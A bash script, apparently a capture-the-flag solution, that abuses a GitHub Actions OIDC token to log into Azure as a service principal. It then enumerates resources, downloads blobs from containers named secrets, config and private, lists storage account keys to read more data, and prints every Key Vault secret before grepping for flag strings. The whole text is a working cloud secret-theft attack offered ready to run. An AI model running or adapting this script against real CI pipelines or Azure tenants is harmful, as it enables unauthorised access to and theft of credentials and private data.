#!/usr/bin/env bash
set -eo pipefail
IDTOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
echo "[+] OIDC token length: ${#IDTOK}"
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$IDTOK" --allow-no-subscriptions -o none
az account set -s "$AZURE_SUBSCRIPTION_ID" 2>/dev/null || true
echo "=== account ==="; az account show -o json || true
echo "=== resources ==="; az resource list -o table || true
echo "=== storage accounts ==="; az storage account list --query "[].name" -o tsv | tee sa.txt || true
while read -r ACCT; do [ -z "$ACCT" ] && continue
  for CONT in config flag flags secrets private data; do
    for B in $(az storage blob list --account-name "$ACCT" --container-name "$CONT" --auth-mode login --query "[].name" -o tsv 2>/dev/null); do
      echo "=== blob $ACCT/$CONT/$B ==="
      az storage blob download --account-name "$ACCT" --container-name "$CONT" --name "$B" --auth-mode login --file /dev/stdout 2>/dev/null; echo
    done; done; done < sa.txt
while read -r ACCT; do [ -z "$ACCT" ] && continue
  KEY=$(az storage account keys list -n "$ACCT" --query "[0].value" -o tsv 2>/dev/null) || continue; [ -z "$KEY" ] && continue
  for CONT in config flag flags secrets private data; do
    for B in $(az storage blob list --account-name "$ACCT" --container-name "$CONT" --account-key "$KEY" --query "[].name" -o tsv 2>/dev/null); do
      echo "=== (key) blob $ACCT/$CONT/$B ==="
      az storage blob download --account-name "$ACCT" --container-name "$CONT" --name "$B" --account-key "$KEY" --file /dev/stdout 2>/dev/null; echo
    done; done; done < sa.txt
for KV in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  for S in $(az keyvault secret list --vault-name "$KV" --query "[].name" -o tsv 2>/dev/null); do
    echo "KV $KV/$S = $(az keyvault secret show --vault-name "$KV" --name "$S" --query value -o tsv 2>/dev/null)"
  done; done
echo "=== FLAG CANDIDATES ==="
{ az resource list -o json 2>/dev/null; az account show -o json 2>/dev/null; } | grep -rhoiE "DFCD\{[^}]*\}|flag\{[^}]*\}" | sort -u || true
echo "[*] done"
